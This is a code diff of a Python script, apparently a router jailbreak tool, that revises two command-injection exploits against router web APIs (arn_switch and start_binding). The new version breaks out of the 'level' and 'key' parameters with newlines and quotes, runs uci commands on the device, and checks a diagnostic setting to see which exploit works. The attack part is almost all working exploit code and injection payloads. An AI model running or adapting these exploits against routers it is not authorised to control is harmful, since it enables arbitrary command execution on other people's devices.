@@ -39,45 +39,44 @@ print(f'Current CountryCode = {ccode}')
 stok = gw.web_login()
 
 
-def exploit_1(cmd = { }, api = 'misystem/arn_switch'):
+def exploit_1(cmd, api = 'API/misystem/arn_switch'):
     # vuln/exploit author: ?????????
-    params = cmd
-    if isinstance(cmd, str):
-        cmd = cmd.replace(';', '\n')
-        params = { 'open': 1, 'mode': 1, 'level': "\n" + cmd + "\n" }
-    res = requests.get(gw.apiurl + api, params = params)
-    return res.text
+    cmd = cmd.replace(';', '\n')
+    params = { 'open': 1, 'mode': 1, 'level': "\n" + cmd + "\n" }
+    res = gw.api_request(api, params, resp = 'text')
+    time.sleep(0.5)
+    return res
 
-def exploit_2(cmd = { }, api = 'xqsystem/start_binding'):
+def exploit_2(cmd, api = 'API/xqsystem/start_binding'):
     # vuln/exploit author: ?????????
-    params = cmd
-    if isinstance(cmd, str):
-        cmd = cmd.replace(';', '\n')
-        params = { 'uid': 1234, 'key': "1234'\n" + cmd + "\n'" }
-    res = requests.get(gw.apiurl + api, params = params)
-    return res.text
+    cmd = cmd.replace(';', '\n')
+    params = { 'uid': 1234, 'key': "1234' -X \n" + cmd + "\n logger -t X 'X" }
+    try:
+        res = gw.api_request(api, params, resp = 'text', timeout = 1.5)
+    except requests.exceptions.ReadTimeout:
+        res = ''
+    return res
 
 
-# get device orig system time
-dst = gw.get_device_systime()
+# set default value for iperf_test_thr
+gw.set_diag_iperf_test_thr(20)
 
+vuln_test_num = 82000011
 exec_cmd = None
 exp_list = [ exploit_2, exploit_1 ]
-for exp_func in exp_list:
-    res = exp_func("date -s 203301020304")
+for idx, exp_func in enumerate(exp_list):
+    exp_test_num = vuln_test_num + idx
+    res = exp_func(f"uci set diag.config.iperf_test_thr={exp_test_num} ; uci commit diag")
     #if '"code":0' not in res:
     #    continue
-    time.sleep(1.2)
-    dxt = gw.get_device_systime()
-    if dxt['year'] == 2033 and dxt['month'] == 1 and dxt['day'] == 2:
-        if dxt['hour'] == 3 and dxt['min'] == 4:
-            exec_cmd = exp_func
-            break
-    time.sleep(1)
+    iperf_test_thr = gw.get_diag_iperf_test_thr()
+    if iperf_test_thr == str(exp_test_num):
+        exec_cmd = exp_func
+        break
+    time.sleep(0.5)
 
-# restore orig system time
-time.sleep(1)
-gw.set_device_systime(dst)
+# set default value for iperf_test_thr
+gw.set_diag_iperf_test_thr(20)
 
 if not exec_cmd:
     die('Exploits arn_switch/start_binding not working!!!')
